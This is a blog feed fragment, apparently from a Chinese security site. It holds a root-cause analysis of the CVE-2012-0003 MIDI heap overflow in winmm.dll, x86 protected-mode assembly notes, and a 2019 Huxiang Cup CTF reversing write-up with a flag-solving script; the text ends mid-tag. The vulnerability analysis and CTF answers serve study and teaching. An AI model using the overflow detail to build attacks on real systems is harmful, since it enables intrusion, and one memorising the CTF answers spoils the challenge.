    <summary type="html">&lt;h1 id=&quot;CVE-2010-2553-CVDecompress堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2010-2553-CVDecompress堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2010-2553</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2012-0003 MIDI 文件堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2012-0003%20MIDI%20%E6%96%87%E4%BB%B6%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2012-0003%20MIDI%20%E6%96%87%E4%BB%B6%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</id>
    <published>2019-12-30T16:00:00.000Z</published>
    <updated>2020-03-16T04:40:24.120Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2012-0003-MIDI-文件堆溢出分析"><a href="#CVE-2012-0003-MIDI-文件堆溢出分析" class="headerlink" title="CVE-2012-0003 MIDI 文件堆溢出分析"></a>CVE-2012-0003 MIDI 文件堆溢出分析</h1><p>该漏洞成因主要是由于 winmm.dll 动态链接库在处理 MIDI 文件的 Note On 和 Note Off 字段没有做限制，导致可以操纵该字段访问堆块之外 1 个字节的内存空间；由于该漏洞过于特殊，所以在分析和利用的时候难度是相当大的。</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>IE6   wnimm.dll</p></blockquote><h2 id="MIDI-文件格式"><a href="#MIDI-文件格式" class="headerlink" title="MIDI 文件格式"></a>MIDI 文件格式</h2><p>MIDI 全称 Musical Instrument Digital Interface，是一种乐器数字接口（通过winmm.dll 链接库解析这种格式的文件之后可以播放出音乐）</p><p>总体来说 MIDI 可分为 “头块” 和若干多的 “音轨块”<br><a href="https://i.loli.net/2019/12/28/ACdeJFDR8tj9B6Y.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/ACdeJFDR8tj9B6Y.png" class="lazyload"></a></p><p>头块结构如下<br><a href="https://i.loli.net/2019/12/28/rpXTb2B1h4KeZED.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/rpXTb2B1h4KeZED.png" class="lazyload"></a></p><p>音轨事件如下<br><a href="https://i.loli.net/2019/12/28/wZozQXrlI1NOFmY.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/wZozQXrlI1NOFmY.png" class="lazyload"></a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><p>poc.html 样本中嵌入了一个音频播放器，由音频播放器来调用 toto.mid 文件播放音频从而触发漏洞</p><p>如果先运行windbg设置堆溢出检测标志，当前IE进程将无法运行poc，需要在命令行先设置gflag再运行windbg。</p><p><a href="https://i.loli.net/2019/12/28/ZKg4o5QFxMaGlkm.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/ZKg4o5QFxMaGlkm.png" class="lazyload"></a></p><p>F5 运行之后将 poc.html 文件拖入 IE，并且允许运行 ActiveX 控件<br>断下异常，可以看出 esi 指向的地址超出了堆空间，之后被堆页保护捕捉到<br><a href="https://i.loli.net/2019/12/28/C1SEImayw3O2QZV.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/C1SEImayw3O2QZV.png" class="lazyload"></a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://i.loli.net/2019/12/28/BypUiQqwgMhOVZ4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/BypUiQqwgMhOVZ4.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2019/12/28/ZEVQ5P4FBgkUYJH.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/ZEVQ5P4FBgkUYJH.png" class="lazyload"></a></p><p>shift + F4 对 v2、v9、v11、v13、v21、v23 和 v20 下条件记录断点，记录表达数值<br>v20 int3断点<br>运行poc后查看日志</p><p>分析看出 v11、v13、v21 相等<br>v2 不变，v20 最后才被记录，且指向的地址都在 0x07EC0000 往后的堆中<br>v23 的值，也就是 0x007DB29F 是来自漏洞样本的数据，结合MIDI 格式分析可以知道，9F 代表的就是打开音符（Note On），F 就是通道号</p><p>通道号 F 经过计算之后值为 419，控制着指针的偏移地址，也就是 v24 的值<br>v20 由传入的参数 wParam 控制，midiOutTimerTick函数调用了 midiOutPlayNextPolyEvent 函数，并且把 v6 当作参数传入，而 v6 = gpEmuList，gpEmuList在mseOpen 函数中被引用<br><a href="https://i.loli.net/2019/12/28/BzQLi83RXwCcbZM.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/BzQLi83RXwCcbZM.png" class="lazyload"></a></p><p>最后分析出v20=v6,因为 v6 是堆块的基地址，且这个堆块的大小为 0x400，所以 v20 也为这个 0x400 堆块的基地址</p><p>v25 的指针由 v24 和 v20 相加得出，v20 是堆的基址，而 v24 是样本数据解析运算获得，由于没有限制通道号的大小，导致运算后的偏移地址 v24 为 419，可是堆只有 0x400大小，很显然超出了申请的堆空间，照成了非法访问，故引发了堆页保护异常</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;CVE-2012-0003-MIDI-文件堆溢出分析&quot;&gt;&lt;a href=&quot;#CVE-2012-0003-MIDI-文件堆溢出分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2012-0003 MIDI</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编-从实模式到保护模式</title>
    <link href="https://kabeor.github.io/x86%E6%B1%87%E7%BC%96%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    <id>https://kabeor.github.io/x86%E6%B1%87%E7%BC%96%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</id>
    <published>2019-12-30T16:00:00.000Z</published>
    <updated>2020-03-16T04:51:23.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="x86汇编-从实模式到保护模式"><a href="#x86汇编-从实模式到保护模式" class="headerlink" title="x86汇编-从实模式到保护模式"></a>x86汇编-从实模式到保护模式</h1><blockquote><p>注释</p></blockquote><p>注释必须以分号“;”开始。</p><blockquote><p>在屏幕上显示文字</p></blockquote><p>文本模式和图形模式是显卡的两种基本工作模式，可以用指令访问显卡，设置它的显示模式。在不同的工作模式下，显卡对显存内容的解释是不同的。</p><p>为了访问显存，也需要使用逻辑地址，也就是采用“段地址：偏移地址”的形式</p><p>Intel的处理器不允许将一个立即数传送到段寄存器，它只允许这样的指令：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 段寄存器，通用寄存器 </span><br><span class="line">mov 段寄存器，内存单元</span><br><span class="line"></span><br><span class="line">         mov ax,0xb800                 ;指向文本模式的显示缓冲区</span><br><span class="line">         mov es,ax</span><br></pre></td></tr></table></figure></div><blockquote><p>显示字符</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov byte [es:0x00],&#39;L&#39;</span><br><span class="line">mov byte [es:0x01],0x07          ;将属性值0x07传送到下一个内存单元</span><br><span class="line">mov byte [es:0x02],&#39;a&#39;</span><br><span class="line">mov byte [es:0x03],0x07</span><br><span class="line">mov byte [es:0x04],&#39;b&#39;</span><br><span class="line">mov byte [es:0x05],0x07</span><br></pre></td></tr></table></figure></div><blockquote><p>显示标号的汇编地址</p></blockquote><p>asm编译后，除了生成一个以“.bin”为扩展名的二进制文件，还会生成一个以“.lst”为扩展名的列表文件。这张表列出编译后生成的列表文件内容。</p><p>在编译阶段，每条指令都被计算并赋予了一个汇编地址，就像它们已经被加载到内存中的某个段里一样。实际上，当编译好的程序加载到物理内存后，它在段内的偏移地址和它在编译阶段的汇编地址是相等的。</p><p>源程序的编译是从上往下的，而内存地址的增长是从下往上的（从低地址往高地址方向增长）。</p><blockquote><p>loop</p></blockquote><p>loop指令的功能是重复执行一段相同的代码，处理器在执行它的时候会顺序做两件事： <strong>将寄存器CX的内容减一； 如果CX的内容不为零，转移到指定的位置处执行，否则顺序执行后面的指令。</strong></p><blockquote><p>计算1到100的和</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    xor ax,ax</span><br><span class="line">    mov cx,1</span><br><span class="line">@f:</span><br><span class="line">    add ax,cx</span><br><span class="line">    inc cx</span><br><span class="line">    cmp cx,100</span><br><span class="line">    jle @f</span><br></pre></td></tr></table></figure></div><blockquote><p>分段、段的汇编地址和段内汇编地址</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Intel处理器要求段在内存中的起始物理地址起码是16字节对齐的。这句话的意思是，必须是16的倍数，或者说该物理地址必须能被16整除。</span><br><span class="line">相应地，汇编语言源程序中定义的各个段，也有对齐方面的要求。具体做法是，在段定义中使用“align&#x3D;”子句，用于指定某个SECTION的汇编地址对齐方式。比如说，“align&#x3D;16”就表示段是16字节对齐的，“align&#x3D;32”就表示段是32字节对齐的。</span><br><span class="line">段的重定位是加载器的工作，它需要知道每个段在用户程序内的位置，即它们分别位于用户程序内的多少字节处。为此，需要在用户程序头部建立一张段重定位表。</span><br></pre></td></tr></table></figure></div><blockquote><p>实模式下的中断向量表</p></blockquote><p>在实模式下，处理器要求将与该中断有关的程序（指令）的入口点集中存放到内存中从物理地址0x00000开始，到0x003ff结束，共1KB的空间内，这就是所谓的中断向量表（Interrupt Vector Table，IVT）。</p><blockquote><p>初始化8259、RTC和中断向量表</p></blockquote><p>当处理器执行任何一条改变堆栈段寄存器SS的指令时，它会在下一条指令执行完期间禁止中断。</p><p>绝大多数时候，对堆栈的改变是分两步进行的：先改变段寄存器SS的内容，接着又修改堆栈指针寄存器SP的内容。</p><blockquote><p>软 中 断</p></blockquote><p>int3和int 3不是一回事。前者的机器码为CC，后者则是CD 03，这就是通常所说的int n，其操作码为0xCD，第2字节的操作数给出了中断号。</p><p>into是溢出中断指令，机器码为0xCE，也是单字节指令。当处理器执行这条指令时，如果标志寄存器的OF位是1，那么，将产生4号中断。否则，这条指令什么也不做。</p><h2 id="32位保护模式"><a href="#32位保护模式" class="headerlink" title="32位保护模式"></a>32位保护模式</h2><blockquote><p>32位Intel微处理器编程架构</p></blockquote><p>80286和8086不一样的地方在于，它第一次提出了保护模式的概念。在保护模式下，段寄存器中保存的不再是段地址，而是段选择子，真正的段地址位于段寄存器的描述符高速缓存中，是24位的。因此，运行在保护模式下的80286处理器可以访问全部16MB内存。</p><p>在保护模式下，所有的32位处理器都可以访问多达4GB的内存，它们可以工作在分段模型下，每个段的基地址是32位的，段内偏移量也是32位的，因此，段的长度不受限制。在最典型的情况下，可以将整个4GB内存定义成一个段来处理，这就是所谓的平坦模式。在平坦模式下，可以执行4GB范围内的控制转移，也可以使用32位的偏移量访问任何4GB范围内的任何位置。32位保护模式兼容80286的16位保护模式。</p><p>在实模式下，用户程序对内存的访问非常自由，没有任何限制，随随便便就可以修改任何一个内存单元。</p><blockquote><p>全局描述符表</p></blockquote><p>为了让程序在内存中能自由浮动而又不影响它的正常执行，处理器将内存划分成逻辑上的段，并在指令中使用段内偏移地址。在保护模式下，对内存的访问仍然使用段地址和偏移地址，但是，在每个段能够访问之前，必须先进行登记。</p><p>和一个段有关的信息需要8个字节来描述，所以称为段描述符（Segment Descriptor），每个段都需要一个描述符。为了存放这些描述符，需要在内存中开辟出一段空间。在这段空间里，所有的描述符都是挨在一起，集中存放的，这就构成一个描述符表。<br>       最主要的描述符表是全局描述符表（Global Descriptor Table，GDT），所谓全局，意味着该表是为整个软硬件系统服务的。在进入保护模式前，必须要定义全局描述符表。</p><p>描述符不是由用户程序自己建立的，而是在加载时，由操作系统根据你的程序结构而建立的，而用户程序通常是无法建立和修改GDT的。</p><blockquote><p>存储器的段描述符</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">段基地址可以是0～4GB范围内的任意地址，不过，还是建议应当选取那些16字节对齐的地址。尽管对于Intel处理器来说，允许不对齐的地址，但是，对齐能够使程序在访问代码和数据时的性能最大化。这一点，对于那些学过计算机原理，特别是了解内存芯片组织的人来说，是最清楚不过的。</span><br><span class="line">20位的段界限用来限制段的扩展范围。因为访问内存的方法是用段基地址加上偏移量，所以，对于向上扩展的段，如代码段和数据段来说，偏移量是从0开始递增，段界限决定了偏移量的最大值；对于向下扩展的段，如堆栈段来说，段界限决定了偏移量的最小值。</span><br><span class="line">G位是粒度（Granularity）位，用于解释段界限的含义。当G位是“0”时，段界限以字节为单位。此时，段的扩展范围是从1字节到1兆字节（1B～1MB），因为描述符中的界限值是20位的。相反，如果该位是“1”，那么，段界限是以4KB为单位的。这样，段的扩展范围是从4KB到4GB。</span><br><span class="line">S位用于指定描述符的类型（Descriptor Type）。当该位是“0”时，表示是一个系统段；为“1”时，表示是一个代码段或者数据段（堆栈段也是特殊的数据段）。系统段将在以后介绍。</span><br><span class="line">DPL表示描述符的特权级（Descriptor Privilege Level，DPL）。这两位用于指定段的特权级。共有4种处理器支持的特权级别，分别是0、1、2、3，其中0是最高特权级别，3是最低特权级别。刚进入保护模式时执行的代码具有最高特权级0（可以看成是从处理器那里继承来的），这些代码通常都是操作系统代码，因此它的特权级别最高。每当操作系统加载一个用户程序时，它通常都会指定一个稍低的特权级，比如3特权级。不同特权级别的程序是互相隔离的，其互访是严格限制的，而且有些处理器指令（特权指令）只能由0特权级的程序来执行，为的就是安全。</span><br><span class="line">P是段存在位（Segment Present）。P位用于指示描述符所对应的段是否存在。一般来说，描述符所指示的段都位于内存中。但是，当内存空间紧张时，有可能只是建立了描述符，对应的内存空间并不存在，这时，就应当把描述符的P位清零，表示段并不存在。另外，同样是在内存空间紧张的情况下，会把很少用到的段换出到硬盘中，腾出空间给当前急需内存的程序使用（当前正在执行的），这时，同样要把段描述符的P位清零。当再次轮到它执行时，再装入内存，然后将P位置1。</span><br><span class="line">P位是由处理器负责检查的。每当通过描述符访问内存中的段时，如果P位是“0”，处理器就会产生一个异常中断。通常，该中断处理过程是由操作系统提供的，该处理过程的任务是负责将该段从硬盘换回内存，并将P位置1。在多用户、多任务的系统中，这是一种常用的虚拟内存调度策略。当内存很小，运行的程序很多时，如果计算机的运行速度变慢，并伴随着繁忙的硬盘操作时，说明这种情况正在发生。</span><br><span class="line">D&#x2F;B位是“默认的操作数大小”（Default Operation Size）或者“默认的堆栈指针大小”（Default Stack Pointer Size），又或者“上部边界”（Upper Bound）标志。</span><br></pre></td></tr></table></figure></div><blockquote><p>安装存储器的段描述符并加载GDTR</p></blockquote><p>处于实模式下，在GDT中安装描述符，必须将GDT的线性地址转换成段地址和偏移地址。</p><p>处理器规定，GDT中的第一个描述符必须是空描述符，或者叫哑描述符或NULL描述符。</p><blockquote><p>保护模式下的内存访问</p></blockquote><p>控制这达实模式和保护模式切换的开关是在一个叫CR0的寄存器。</p><p>CR0是处理器内部的控制寄存器（Control Register，CR）。之所以有个“0”后缀，是因为还有CR1、CR2、CR3和CR4控制寄存器，甚至还有CR8。<br>        CR0是32位的寄存器，包含了一系列用于控制处理器操作模式和运行状态的标志位。它的第1位（位0）是保护模式允许位（Protection Enable，PE），是开启保护模式大门的门把手，如果把该位置“1”，则处理器进入保护模式，按保护模式的规则开始运行。</p><p>保护模式下的中断机制和实模式不同，因此，原有的中断向量表不再适用，而且，必须要知道的是，在保护模式下，BIOS中断都不能再用，因为它们是实模式下的代码。在重新设置保护模式下的中断环境之前，必须关中断。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cli                                ;保护模式下中断机制尚未建立，应 </span><br><span class="line">                                   ;禁止中断 </span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure></div><p>在保护模式下访问一个段时，传送到段选择器的是段选择子。它由三部分组成，第一部分是描述符的索引号，用来在描述符表中选择一个段描述符。TI 是描述符表指示器（Table Indicator），TI＝0 时，表示描述符在GDT 中；TI＝1 时，描述符在LDT 中。LDT 也是一个描述符表，和GDT 类似。RPL 是请求特权级，表示给出当前选择子的那个程序的特权级别，正是该程序要求访问这个内存段。每个程序都有特权级别，</p><blockquote><p>清空流水线并串行化处理器</p></blockquote><p>即使是在实模式下，段寄存器的描述符高速缓存器也被用于访问内存，仅低20位有效，高12位是全零。当处理器进入保护模式后，不影响段寄存器的内容和使用，它们依然是有效的，程序可以继续执行。但是，在保护模式下，对段的解释是不同的，处理器会把段选择器里的内容看成是描述符选择子，而不是逻辑段地址。因此，比较安全的做法是尽快刷新CS、SS、DS、ES、FS和GS的内容，包括它们的段选择器和描述符高速缓存器。</p><p>在进入保护模式前，有很多指令已经进入了流水线。因为处理器工作在实模式下，所以它们都是按16位操作数和16位地址长度进行译码的，即使是那些用bits 32编译的指令。进入保护模式后，由于对段地址的解释不同，对操作数和默认地址大小的解释也不同，有些指令的执行结果可能会不正确，所以必须清空流水线。同时，那些通过乱序执行得到的中间结果也是无效的，必须清理掉，让处理器串行化执行，即，重新按指令的自然顺序执行。</p><p>使用32位远转移指令jmp或者远过程调用指令call。处理器最怕转移指令，遇到这种指令，一般会清空流水线，并串行化执行；另一方面，远转移会重新加载段选择器CS，并刷新描述符高速缓存器中的内容。唯一的问题是，这条指令必须在bits 16下编译，使得处理器能够在16位模式下正确译码；同时，还必须编译成32位操作数的指令，使处理器在刚进入保护模式时能正确执行。<strong>一个建议的方法是在设置了控制寄存器CR0的PE位之后，立即用jmp或者call转移到当前指令流的下一条指令上。</strong></p><blockquote><p>保护模式下的堆栈</p></blockquote><p>堆栈是向下扩展的，因此，描述符中的段界限，和向上扩展的段含义不同。对于向上扩展的段，段内偏移量是从0开始递增，偏移量的最大值是界限值和粒度的乘积；而对于向下扩展的段来说，因为它经常用做堆栈段，而堆栈是从高地址向低地址方向推进的，故段内偏移量的最小值是界限值和粒度的乘积加一。在32位代码中，是用ESP作为堆栈指针的。因此，这里的段界限，用来和段粒度一起，决定ESP寄存器所能具有的最小值。即，堆栈操作时，必须符合条件： </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ESP ＞ 段界限×粒度值</span><br></pre></td></tr></table></figure></div><p>对于描述符中G位是“0”的段来说，粒度值是1（字节）；而对于G位是“1”的段来说，粒度值是4096（4KB）。</p><blockquote><p>进入32位保护模式</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;设置堆栈段和栈指针 </span><br><span class="line">mov eax,cs      </span><br><span class="line">mov ss,eax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">      </span><br><span class="line">;计算GDT所在的逻辑段地址</span><br><span class="line">mov eax,[cs:pgdt+0x7c00+0x02]      ;GDT的32位线性基地址 </span><br><span class="line">xor edx,edx</span><br><span class="line">mov ebx,16</span><br><span class="line">div ebx                            ;分解成16位逻辑地址 </span><br><span class="line"></span><br><span class="line">mov ds,eax                         ;令DS指向该段以进行操作</span><br><span class="line">mov ebx,edx                        ;段内起始偏移地址 </span><br><span class="line"></span><br><span class="line">;创建0#描述符，它是空描述符，这是处理器的要求</span><br><span class="line">mov dword [ebx+0x00],0x00000000</span><br><span class="line">mov dword [ebx+0x04],0x00000000  </span><br><span class="line"></span><br><span class="line">;创建1#描述符，这是一个数据段，对应0~4GB的线性地址空间</span><br><span class="line">mov dword [ebx+0x08],0x0000ffff    ;基地址为0，段界限为0xfffff</span><br><span class="line">mov dword [ebx+0x0c],0x00cf9200    ;粒度为4KB，存储器段描述符 </span><br><span class="line"></span><br><span class="line">;创建保护模式下初始代码段描述符</span><br><span class="line">mov dword [ebx+0x10],0x7c0001ff    ;基地址为0x00007c00，512字节 </span><br><span class="line">mov dword [ebx+0x14],0x00409800    ;粒度为1个字节，代码段描述符 </span><br><span class="line"></span><br><span class="line">;创建以上代码段的别名描述符</span><br><span class="line">mov dword [ebx+0x18],0x7c0001ff    ;基地址为0x00007c00，512字节</span><br><span class="line">mov dword [ebx+0x1c],0x00409200    ;粒度为1个字节，数据段描述符</span><br><span class="line"></span><br><span class="line">mov dword [ebx+0x20],0x7c00fffe</span><br><span class="line">mov dword [ebx+0x24],0x00cf9600</span><br><span class="line"></span><br><span class="line">;初始化描述符表寄存器GDTR</span><br><span class="line">mov word [cs: pgdt+0x7c00],39      ;描述符表的界限   </span><br><span class="line"> </span><br><span class="line">lgdt [cs: pgdt+0x7c00]</span><br><span class="line">      </span><br><span class="line">in al,0x92                         ;南桥芯片内的端口 </span><br><span class="line">or al,0000_0010B</span><br><span class="line">out 0x92,al                        ;打开A20</span><br><span class="line"></span><br><span class="line">cli                                ;中断机制尚未工作</span><br><span class="line"></span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,1</span><br><span class="line">mov cr0,eax                        ;设置PE位</span><br><span class="line">      </span><br><span class="line">;以下进入保护模式... ...</span><br></pre></td></tr></table></figure></div><blockquote><p>内核的结构</p></blockquote><p>内核分为四个部分，分别是初始化代码、内核代码段、内核数据段和内核例程段，主引导程序也是初始化代码的组成部分。</p><p>初始化代码用于从BIOS那里接管处理器和计算机硬件的控制权，安装最基本的段描述符，初始化最初的执行环境。然后，从硬盘上读取和加载内核的剩余部分，创建组成内核的各个内存段。</p><p>内核代码段用于分配内存，读取和加载用户程序，控制用户程序的执行。</p><p>内核数据段提供了一段可读写的内存空间，供内核自己使用。<br>       内核例程段用于提供各种用途和功能的子过程以简化代码的编写。这些例程既可以用于内核，也供用户程序调用。</p><p>内核文件还包括一个头部，记录了各个段的汇编位置，这些统计数<br>据用于告诉初始化代码如何加载内核。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;x86汇编-从实模式到保护模式&quot;&gt;&lt;a href=&quot;#x86汇编-从实模式到保护模式&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2019湖湘杯线上 RE WriteUp</title>
    <link href="https://kabeor.github.io/2019%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8ARE%20WriteUp/"/>
    <id>https://kabeor.github.io/2019%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8ARE%20WriteUp/</id>
    <published>2019-11-11T16:00:00.000Z</published>
    <updated>2020-03-16T04:53:31.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019湖湘杯线上-RE-WriteUp"><a href="#2019湖湘杯线上-RE-WriteUp" class="headerlink" title="2019湖湘杯线上 RE WriteUp"></a>2019湖湘杯线上 RE WriteUp</h1><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>UPX壳，脱壳机即可<br><a href="https://i.loli.net/2019/11/12/jqJv27PZzWxYHFl.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/jqJv27PZzWxYHFl.png" class="lazyload"></a></p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>主函数逻辑如下<br><a href="https://i.loli.net/2019/11/12/aLJfMiovY8u4psT.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/aLJfMiovY8u4psT.png" class="lazyload"></a></p><p>检测命令行输入格式为 文件名 flag.txt</p><p>flag.txt由如下脚本解得。</p><p><a href="https://i.loli.net/2019/11/12/R8lLtbvHrVMDcxw.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/R8lLtbvHrVMDcxw.png" class="lazyload"></a></p><p>之后读入txt，检测输入为32位<br>       然后进入两个处理函数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sub_4113B1(xmm0_4_0, &amp;Buf, &amp;unk_41A4E0);  &#x2F;&#x2F; 处理1</span><br><span class="line">if ( sub_4113B6(xmm0_4_0, &amp;unk_41A4E0) )  &#x2F;&#x2F; 处理2</span><br></pre></td></tr></table></figure></div><p><strong>处理1</strong></p><p><a href="https://i.loli.net/2019/11/12/lAuqRQ8NUp2fBVj.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/lAuqRQ8NUp2fBVj.png" class="lazyload"></a></p><p>将输入每两位一起进行处理，判断两位中的第一个值是否在与0-9或a-f中，如果在就减去48或87，<br>这里的数组将在处理2中作为验证数据。</p><p><strong>处理2</strong></p><p><a href="https://i.loli.net/2019/11/12/xgRSojfDydc3Opl.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/xgRSojfDydc3Opl.png" class="lazyload"></a></p><p>第一位左移4位+第二位的结果加上1与dword_41A078数据进行比较。</p><p><strong>flag脚本</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D; [0x50, 0xC6, 0xF1, 0xE4, 0xE3, 0xE2, 0x9A, 0xA1,0xA7,0xde,0xda,70,171,46,255,219]</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in flag:</span><br><span class="line">    i -&#x3D; 1</span><br><span class="line">    s +&#x3D; str(hex(i&gt;&gt;4))[2:]</span><br><span class="line">    s +&#x3D; str(hex(i&amp;0xf))[2:]</span><br><span class="line"></span><br><span class="line">print s</span><br></pre></td></tr></table></figure></div><h2 id="esrever"><a href="#esrever" class="headerlink" title="esrever"></a>esrever</h2><p>迷宫,动态反调试没什么用</p><p><a href="https://i.loli.net/2019/11/12/CvUN6KQDSJilu7c.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/CvUN6KQDSJilu7c.png" class="lazyload"></a><br>输入比较巧妙，过反调试以后动态调很复杂，但很清晰看到是控制7*7二维数组上下左右</p><p><a href="https://i.loli.net/2019/11/12/c5oH6DYshdEWUp3.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/c5oH6DYshdEWUp3.png" class="lazyload"></a></p><p>提取迷宫<br><a href="https://i.loli.net/2019/11/12/4jl2mHYWAFXQUBg.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2019/11/12/4jl2mHYWAFXQUBg.png" class="lazyload"></a></p><p>知道映射关系就不用考虑输入，直接考虑输出是什么就可以了。<br><a href="https://i.loli.net/2019/11/12/jCDMgiAa3sIJwP8.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" 